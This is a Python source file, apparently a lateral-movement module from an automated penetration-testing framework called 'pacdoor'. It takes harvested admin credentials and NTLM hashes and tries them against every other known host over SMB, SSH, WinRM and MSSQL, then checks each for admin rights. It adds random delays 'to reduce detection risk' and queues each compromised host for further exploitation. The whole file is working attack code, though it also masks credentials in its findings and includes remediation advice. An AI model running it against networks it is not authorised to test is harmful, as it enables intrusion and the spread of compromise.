"""Lateral movement — use harvested credentials to access new hosts.

This is the KEY module that makes the planner loop back through
ENUM -> VULN -> EXPLOIT for newly accessed hosts.  For each
admin credential x host combination (skipping the originating host),
it attempts SMB, SSH, WinRM, and MSSQL login.  Successful lateral
hops register the new host as a ``host`` fact, triggering the full
re-enumeration pipeline.
"""

from __future__ import annotations

import asyncio
import logging
import random
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Host,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# Jitter range in seconds between lateral move attempts.
_JITTER_MIN = 1.0
_JITTER_MAX = 3.0

# Socket/connection timeout for individual attempts.
_CONNECT_TIMEOUT = 10


# ── Optional-import helpers ───────────────────────────────────────────────

_impacket_smb_available: bool | None = None
_paramiko_available: bool | None = None
_impacket_tds_available: bool | None = None


def _ensure_impacket_smb() -> bool:
    global _impacket_smb_available  # noqa: PLW0603
    if _impacket_smb_available is not None:
        return _impacket_smb_available
    try:
        from impacket.smbconnection import (
            SMBConnection,  # type: ignore[import-untyped]  # noqa: F401
        )

        _impacket_smb_available = True
    except ImportError:
        log.debug("impacket not installed — SMB lateral movement unavailable")
        _impacket_smb_available = False
    return _impacket_smb_available


def _ensure_paramiko() -> bool:
    global _paramiko_available  # noqa: PLW0603
    if _paramiko_available is not None:
        return _paramiko_available
    try:
        import paramiko  # type: ignore[import-untyped]  # noqa: F401

        _paramiko_available = True
    except ImportError:
        log.debug("paramiko not installed — SSH lateral movement unavailable")
        _paramiko_available = False
    return _paramiko_available


def _ensure_impacket_tds() -> bool:
    global _impacket_tds_available  # noqa: PLW0603
    if _impacket_tds_available is not None:
        return _impacket_tds_available
    try:
        from impacket.tds import MSSQL  # type: ignore[import-untyped]  # noqa: F401

        _impacket_tds_available = True
    except ImportError:
        log.debug("impacket TDS not installed — MSSQL lateral movement unavailable")
        _impacket_tds_available = False
    return _impacket_tds_available


# ── Protocol testers (synchronous, run via asyncio.to_thread) ─────────────
# Each returns (success: bool, is_admin: bool, technique_id: str).


def _try_smb(
    ip: str,
    username: str,
    password: str,
    domain: str,
    ntlm_hash: str | None,
) -> tuple[bool, bool]:
    """Attempt SMB login and check C$ admin share access."""
    try:
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445, timeout=_CONNECT_TIMEOUT)
        conn.negotiateSession()
        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        # Check admin share access
        is_admin = False
        try:
            conn.connectTree("C$")
            is_admin = True
        except Exception:
            pass

        conn.logoff()
        return True, is_admin
    except Exception as e:
        log.debug("SMB lateral move to %s failed: %s", ip, e)
        return False, False


def _try_ssh(
    ip: str,
    username: str,
    password: str,
) -> tuple[bool, bool]:
    """Attempt SSH login and check root/sudo privileges."""
    try:
        import paramiko  # type: ignore[import-untyped]

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            ip, port=22, username=username, password=password,
            timeout=_CONNECT_TIMEOUT, allow_agent=False, look_for_keys=False,
        )

        is_admin = username == "root"
        if not is_admin:
            _stdin, stdout, _stderr = client.exec_command("id", timeout=5)
            id_output = stdout.read().decode("utf-8", errors="replace")
            is_admin = "uid=0" in id_output

        client.close()
        return True, is_admin
    except Exception as e:
        log.debug("SSH lateral move to %s failed: %s", ip, e)
        return False, False


def _try_winrm(
    ip: str,
    username: str,
    password: str,
) -> tuple[bool, bool]:
    """Attempt WinRM authentication via HTTP Basic to /wsman."""
    import base64
    import http.client

    try:
        conn = http.client.HTTPConnection(ip, 5985, timeout=_CONNECT_TIMEOUT)
        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
        conn.request("POST", "/wsman", headers={
            "Authorization": f"Basic {creds_b64}",
            "Content-Type": "application/soap+xml;charset=UTF-8",
        })
        resp = conn.getresponse()
        conn.close()
        if resp.status in (200, 301, 302):
            return True, False
        return False, False
    except Exception as e:
        log.debug("WinRM lateral move to %s failed: %s", ip, e)
        return False, False


def _try_mssql(
    ip: str,
    username: str,
    password: str,
) -> tuple[bool, bool]:
    """Attempt MSSQL login and check sysadmin role."""
    try:
        from impacket.tds import MSSQL  # type: ignore[import-untyped]

        ms = MSSQL(ip, 1433)
        ms.connect()
        result = ms.login(None, username, password)
        if result:
            is_admin = False
            try:
                ms.sql_query("SELECT IS_SRVROLEMEMBER('sysadmin')")
                rows = ms.rows
                if rows and rows[0] and rows[0][0] == 1:
                    is_admin = True
            except Exception:
                pass
            ms.disconnect()
            return True, is_admin
        ms.disconnect()
        return False, False
    except Exception as e:
        log.debug("MSSQL lateral move to %s failed: %s", ip, e)
        return False, False


# ── Helpers ───────────────────────────────────────────────────────────────


def _extract_cred_fields(cred: Any) -> tuple[str, str, str, str | None]:
    """Extract (username, password, domain, ntlm_hash) from a credential object or dict."""
    if hasattr(cred, "username"):
        username = cred.username
        password = cred.value
        domain = cred.domain or ""
        ntlm_hash = None
        if hasattr(cred, "cred_type") and str(cred.cred_type) == "ntlm_hash":
            ntlm_hash = password
            password = ""
    else:
        username = str(cred.get("username", ""))
        password = str(cred.get("value", ""))
        domain = str(cred.get("domain", ""))
        ntlm_hash = None
        if cred.get("cred_type") == "ntlm_hash":
            ntlm_hash = password
            password = ""
    return username, password, domain, ntlm_hash


def _mask(value: str) -> str:
    """Mask all but the first two characters of a credential value."""
    if len(value) <= 2:
        return "**"
    return value[:2] + "*" * (len(value) - 2)


# ── Module ────────────────────────────────────────────────────────────────


class LateralMoveModule(BaseModule):
    """Lateral movement using harvested credentials.

    For each admin credential x host combination (skipping hosts where
    the credential originated), attempts SMB (445), SSH (22), WinRM (5985),
    and MSSQL (1433).  Successful hops register the new host as a ``host``
    fact, which triggers the planner to loop back through ENUM -> VULN ->
    EXPLOIT on the newly accessed machine.
    """

    name = "post.lateral_move"
    description = "Lateral movement using harvested credentials to access new hosts"
    phase = Phase.LATERAL_MOVE
    attack_technique_ids = ["T1021", "T1021.002", "T1021.004"]
    required_facts = ["credential.admin", "host"]
    produced_facts = ["host.lateral", "credential.admin"]
    safety = ExploitSafety.MODERATE

    def __init__(self) -> None:
        # Track (cred_id, host_id, protocol) combos already tested to
        # avoid redundant attempts across multiple module runs.
        self._tested: set[tuple[str, str, str]] = set()

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        admin_creds = await ctx.facts.get_all("credential.admin")
        if not admin_creds:
            return findings

        hosts = await ctx.facts.get_values("host")
        if not hosts:
            return findings

        # Build IP -> Host lookup and host_id set.
        host_map: dict[str, Host] = {h.id: h for h in hosts}
        {h.id: h.ip for h in hosts}

        # Collect open ports per host for protocol filtering.
        open_ports = await ctx.facts.get_values("port.open")
        host_ports: dict[str, set[int]] = {}
        for p in open_ports:
            host_ports.setdefault(p.host_id, set()).add(p.port)

        for fact in admin_creds:
            cred = fact.value
            cred_host_id = fact.host_id
            cred_id = cred.id if hasattr(cred, "id") else str(id(cred))

            username, password, domain, ntlm_hash = _extract_cred_fields(cred)
            if not username:
                continue

            for target_host in hosts:
                target_id = target_host.id
                target_ip = target_host.ip

                # Skip the host where this credential originated.
                if target_id == cred_host_id:
                    continue

                target_open = host_ports.get(target_id, set())

                # ── SMB (445) ────────────────────────────────────────
                if 445 in target_open or not target_open:
                    dedup = (cred_id, target_id, "smb")
                    if dedup not in self._tested and _ensure_impacket_smb():
                        self._tested.add(dedup)
                        await self._attempt_lateral(
                            ctx, findings,
                            protocol="smb",
                            technique_id="T1021.002",
                            cred=cred,
                            cred_id=cred_id,
                            cred_host_id=cred_host_id or "",
                            username=username,
                            password=password,
                            domain=domain,
                            ntlm_hash=ntlm_hash,
                            target_host=target_host,
                            target_ip=target_ip,
                            host_map=host_map,
                        )

                # ── SSH (22) ─────────────────────────────────────────
                if 22 in target_open or not target_open:
                    dedup = (cred_id, target_id, "ssh")
                    if dedup not in self._tested and _ensure_paramiko():
                        self._tested.add(dedup)
                        await self._attempt_lateral(
                            ctx, findings,
                            protocol="ssh",
                            technique_id="T1021.004",
                            cred=cred,
                            cred_id=cred_id,
                            cred_host_id=cred_host_id or "",
                            username=username,
                            password=password,
                            domain=domain,
                            ntlm_hash=ntlm_hash,
                            target_host=target_host,
                            target_ip=target_ip,
                            host_map=host_map,
                        )

                # ── WinRM (5985) ─────────────────────────────────────
                if 5985 in target_open:
                    dedup = (cred_id, target_id, "winrm")
                    if dedup not in self._tested:
                        self._tested.add(dedup)
                        await self._attempt_lateral(
                            ctx, findings,
                            protocol="winrm",
                            technique_id="T1021",
                            cred=cred,
                            cred_id=cred_id,
                            cred_host_id=cred_host_id or "",
                            username=username,
                            password=password,
                            domain=domain,
                            ntlm_hash=ntlm_hash,
                            target_host=target_host,
                            target_ip=target_ip,
                            host_map=host_map,
                        )

                # ── MSSQL (1433) ─────────────────────────────────────
                if 1433 in target_open:
                    dedup = (cred_id, target_id, "mssql")
                    if dedup not in self._tested and _ensure_impacket_tds():
                        self._tested.add(dedup)
                        await self._attempt_lateral(
                            ctx, findings,
                            protocol="mssql",
                            technique_id="T1021",
                            cred=cred,
                            cred_id=cred_id,
                            cred_host_id=cred_host_id or "",
                            username=username,
                            password=password,
                            domain=domain,
                            ntlm_hash=ntlm_hash,
                            target_host=target_host,
                            target_ip=target_ip,
                            host_map=host_map,
                        )

        return findings

    async def _attempt_lateral(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        *,
        protocol: str,
        technique_id: str,
        cred: Any,
        cred_id: str,
        cred_host_id: str,
        username: str,
        password: str,
        domain: str,
        ntlm_hash: str | None,
        target_host: Host,
        target_ip: str,
        host_map: dict[str, Host],
    ) -> None:
        """Attempt a single lateral move and handle success."""
        await ctx.rate_limiter.acquire()

        # Random jitter to reduce detection risk.
        await asyncio.sleep(random.uniform(_JITTER_MIN, _JITTER_MAX))

        success, is_admin = await self._run_protocol_test(
            protocol, target_ip, username, password, domain, ntlm_hash,
        )

        if not success:
            return

        target_id = target_host.id
        source_ip = ""
        if cred_host_id and cred_host_id in host_map:
            source_ip = host_map[cred_host_id].ip

        # ── Register the lateral move in the fact store ─────────────
        # Add as "host.lateral" (NOT "host") so it is not silently
        # deduped against the already-known host.  The planner checks
        # for "host.lateral" facts to trigger re-enumeration on
        # newly-compromised hosts.
        new_host = Host(
            id=target_host.id,
            ip=target_ip,
            hostname=target_host.hostname,
            os=target_host.os,
            domain=target_host.domain or domain or None,
        )
        await ctx.facts.add("host.lateral", new_host, self.name, host_id=target_id)
        if ctx.db is not None:
            await ctx.db.insert_host(new_host)

        # ── Register confirmed admin credential on the new host ──────
        new_cred = Credential(
            host_id=target_id,
            username=username,
            cred_type=(
                CredentialType.NTLM_HASH if ntlm_hash
                else CredentialType.PASSWORD
            ),
            value=ntlm_hash or password,
            domain=domain or None,
            source_module=self.name,
            valid=True,
            admin=is_admin,
        )

        await ctx.facts.add(
            "credential.valid", new_cred, self.name, host_id=target_id,
        )
        if is_admin:
            await ctx.facts.add(
                "credential.admin", new_cred, self.name, host_id=target_id,
            )
        if ctx.db is not None:
            await ctx.db.insert_credential(new_cred)

        # ── Record the lateral movement in the attack graph ──────────
        hop_desc = (
            f"Lateral move via {protocol.upper()} from {source_ip or cred_host_id} "
            f"to {target_ip} as {username}"
        )
        path = ctx.attack_graph.add_step(
            from_host_id=cred_host_id,
            to_host_id=target_id,
            technique_id=technique_id,
            credential_id=new_cred.id,
            description=hop_desc,
        )
        if ctx.db is not None:
            await ctx.db.insert_attack_path(path)

        # ── Produce finding ──────────────────────────────────────────
        admin_tag = " [ADMIN]" if is_admin else ""
        cred_display = _mask(ntlm_hash or password)
        finding = Finding(
            title=(
                f"Lateral movement via {protocol.upper()} to "
                f"{target_ip}{admin_tag}"
            ),
            description=(
                f"Successfully authenticated to {target_ip} via "
                f"{protocol.upper()} using credential "
                f"{username}:{cred_display} (originating from "
                f"{source_ip or cred_host_id}). "
                f"{'Administrative access confirmed. ' if is_admin else ''}"
                f"This host is now registered for full enumeration, "
                f"vulnerability scanning, and exploitation."
            ),
            severity=Severity.CRITICAL,
            host_id=target_id,
            module_name=self.name,
            attack_technique_ids=[technique_id],
            evidence=[
                Evidence(
                    kind="lateral_move",
                    data=(
                        f"Protocol: {protocol.upper()}\n"
                        f"Source: {source_ip or cred_host_id}\n"
                        f"Target: {target_ip}\n"
                        f"Credential: {username}:{cred_display}\n"
                        f"Admin: {is_admin}"
                    ),
                ),
                Evidence(
                    kind="attack_path_step",
                    data=f"Step {path.step_order}: {hop_desc}",
                ),
            ],
            remediation=(
                "Segment the network to limit lateral movement. "
                "Implement least-privilege access and remove unnecessary "
                "admin shares (C$). Deploy host-based firewalls to restrict "
                "inbound SMB, SSH, WinRM, and SQL connections. "
                "Use credential tiering to prevent domain admin credentials "
                "from being exposed on lower-tier systems."
            ),
            verified=True,
        )
        findings.append(finding)

        if ctx.db is not None:
            await ctx.db.insert_finding(finding)

    # ── Protocol dispatch ─────────────────────────────────────────────────

    @staticmethod
    async def _run_protocol_test(
        protocol: str,
        ip: str,
        username: str,
        password: str,
        domain: str,
        ntlm_hash: str | None,
    ) -> tuple[bool, bool]:
        """Dispatch to the correct sync protocol tester via ``asyncio.to_thread``."""
        if protocol == "smb":
            return await asyncio.to_thread(
                _try_smb, ip, username, password, domain, ntlm_hash,
            )
        if protocol == "ssh":
            return await asyncio.to_thread(
                _try_ssh, ip, username, password,
            )
        if protocol == "winrm":
            return await asyncio.to_thread(
                _try_winrm, ip, username, password,
            )
        if protocol == "mssql":
            return await asyncio.to_thread(
                _try_mssql, ip, username, password,
            )
        return False, False
